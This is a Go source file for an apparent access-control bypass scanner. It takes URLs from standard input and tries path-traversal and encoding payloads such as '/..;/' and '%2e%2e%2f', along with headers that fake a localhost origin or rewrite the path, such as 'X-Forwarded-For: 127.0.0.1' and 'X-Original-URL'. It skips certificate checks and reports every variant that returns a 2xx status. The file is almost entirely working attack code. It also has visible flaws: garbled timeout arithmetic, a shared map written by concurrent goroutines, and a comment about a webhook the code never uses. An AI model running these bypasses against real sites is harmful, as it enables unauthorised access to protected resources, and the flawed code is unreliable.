package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	flags "github.com/jessevdk/go-flags"
)

func main() {
	headers := map[string]string{"X-ProxyUser-Ip": "127.0.0.1", "Forwarded": "for=127.0.0.1", "X-Forwarded-For": "127.0.0.1", "X-Host": "127.0.0.1", "X-Custom-IP-Authorization": "127.0.0.1", "X-Original-URL": "127.0.0.1", "X-Originating-IP": "127.0.0.1", "X-Remote-IP": "127.0.0.1"}
	payloads := []string{"/", "//", "/*", "/%2f/", "/./", "./.", "/*/", "?", "??", "&", "#", "%", "%20", "%09", "/..;/", "../", "..%2f", "..;/", ".././", "..%00/", "..%0d", "..%5c", "..%ff/", "%2e%2e%2f", ".%2e/", "%3f", "%26", "%23", ".json", "..3B", "/200-OK/..//", "200-OK/%2e%2e/", "200-OK /%2e%2e/", "%2f/", "%2e%2f/", "%252f/", "%5c/", "%C0%AF/", "/.//", "/#/../"}
	var wg sync.WaitGroup
	// Setting Options
	var Options struct {
		// Concurrency For the requests
		Concurrency int `short:"c" long:"concurrency" default:"30" description:"Concurrency For Requests"`
		Timeout     int `short:"t" long:"timeout" description:"timeout" default:"2" required:"false"`
	}

	_, err := flags.Parse(&Options)
	if err != nil {
		return
	}

	// get the value of flags and get webhook url from .env file
	conc := Options.Concurrency
	timeout := time.Duration(Options.Timeout * 1000000)
	urls := getUrls()

	for i := 0; i < conc; i++ {
		wg.Add(1)
		go func(payloads []string, headers map[string]string) {
			defer wg.Done()
			for url := range urls {
				bypass(url, timeout, payloads, headers)
			}
		}(payloads, headers)

	}
	wg.Wait()

}

func bypass(murl string, timeout time.Duration, payloads []string, headers map[string]string) {
	path, _ := url.Parse(murl)
	headersWithUrl := map[string]string{"X-Original-URL": path.Path, "X-Override-URL": path.Path, "X-Rewrite-URL": path.Path, "Referer": murl}
	for key, val := range headersWithUrl {
		headers[key] = val
	}
	// Editing http transport
	trans := &http.Transport{
		// Skip Certificate Error
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		TLSHandshakeTimeout: 2 * time.Second,
	}
	// Editing http client
	client := &http.Client{
		// Passing transport var
		Transport: trans,
		// prevent follow redirect
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Timeout: timeout * time.Second,
	}
	for _, pay := range payloads {
		nwUrl := murl + pay
		// Start an new Get Requets
		req, err := http.NewRequest("GET", nwUrl, nil)
		if err != nil {
			continue
		}
		// Close Connection
		req.Header.Set("Connection", "close")
		// Do the request
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		// Close the response body
		defer resp.Body.Close()
		status := strconv.Itoa(resp.StatusCode)
		if status[0:1] == "2" {
			fmt.Printf("[%s] %s -> %s \n", pay, nwUrl, status)
		}
	}

	for key, val := range headers {
		req, err := http.NewRequest("GET", murl, nil)
		if err != nil {
			continue
		}
		req.Header.Set(key, val)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		// Close the response body
		defer resp.Body.Close()
		status := strconv.Itoa(resp.StatusCode)
		if status[0:1] == "2" {
			fmt.Printf("[%s=%s] %s -> %s \n", key, val, murl, status)
		}
	}

	cptUrl := "https://" + path.Host + strings.Title(path.Path)
	req, err := http.NewRequest("GET", cptUrl, nil)
	if err != nil {
		return
	}
	resp, err := client.Do(req)
	if err != nil {
		return
	}

	// Close the response body
	defer resp.Body.Close()
	status := strconv.Itoa(resp.StatusCode)
	if status[0:1] == "2" {
		fmt.Printf("%s -> %s \n", cptUrl, status)
	}
}

// Read urls from std input in case user do 'cat file'
func getUrls() <-chan string {
	// create urls channel
	urls := make(chan string)
	scan := bufio.NewScanner(os.Stdin)
	go func() {
		defer close(urls)
		for scan.Scan() {
			// send every line to urls channel
			urls <- scan.Text()
		}
	}()
	return urls
}
